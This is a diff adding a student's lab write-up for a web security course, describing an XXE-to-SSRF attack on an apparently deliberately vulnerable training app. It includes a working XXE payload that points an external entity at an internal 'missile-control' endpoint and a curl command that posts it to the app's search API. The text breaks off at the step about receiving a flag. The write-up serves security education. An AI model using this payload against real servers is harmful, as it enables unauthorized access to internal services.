@@ -1,0 +1,28 @@
+Web Application Security
+Student number: AB0168
+Name: Mays Al-Azzawi
+Group: TIC21S
+Time management: Approximately 9 hours
+Week 10
+Server-side Request Forgery:
+Old wasdat – XML external entity SSRF version
+Title: Launch missiles through old Wasdat with SSRF flaw in the backend.
+Description: This vulnerability combines XXE with SSRF. SSRF is a type of attack where an
+attacker can make a server perform requests on their behalf, potentially bypassing security
+controls and accessing resources that should be restricted.
+Steps to produce:
+1. Navigate to http://wasdat.fi:8080.
+2. Edit oldwasdat-exampe.xml- MALICIOUS XML document and include an external entity
+declaration pointing to a resource that want to access, in this case want to access
+‘http://missile-control:6666/launch-the-missiles’ on the server. As in the example below:
+‘’<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://missile-control:6666/launch-the-missiles" >
+]
+>
+<search>&xxe;</search>’’
+3. Send the request to the server by the command:
+curl -X POST http://wasdat.fi:8080/api/articles/custom-search -H "Content-Type:
+text/xml" --data "@/home/kali/Downloads/example.xml"
+4. we received a response as a flag which indicate we finish our
